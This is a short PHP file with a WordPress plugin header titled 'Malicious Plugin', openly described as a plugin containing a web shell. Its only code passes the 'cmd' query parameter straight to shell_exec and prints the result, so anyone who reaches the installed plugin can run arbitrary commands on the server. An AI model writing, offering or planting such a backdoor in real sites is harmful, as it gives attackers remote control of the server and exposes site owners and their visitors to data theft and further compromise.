<?php
/*
Plugin Name: Malicious Plugin
Description: A plugin with a web shell.
Version: 1.0
Author: Bilel G. 
*/

if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
